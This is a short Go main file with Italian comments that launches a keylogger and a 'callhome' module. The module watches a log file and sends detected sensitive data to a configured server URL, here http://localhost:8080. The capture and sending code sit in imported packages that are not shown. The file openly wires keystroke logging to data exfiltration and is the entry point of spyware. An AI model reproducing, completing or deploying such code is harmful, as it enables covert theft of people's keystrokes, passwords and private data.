package main

import (
	"fmt"
	"projectThree/callhome"
	"projectThree/logger"
)

func main() {
	// Inizializza la directory e il file di log
	callhome.InitLogDirectory()
	if err := callhome.InitLogFile(); err != nil {
		fmt.Println("Errore durante la creazione del file log.txt:", err)
		return
	}

	// Test statico
	logger.AppendToFile("Test iniziale di scrittura\n")

	// Configura l'URL del server
	callhome.InitServerURL("http://localhost:8080")

	// Avvia il monitoraggio e il rilevamento dei dati sensibili
	go callhome.MonitorFileAndSend()

	// Avvia il keylogger
	logger.Start()
}
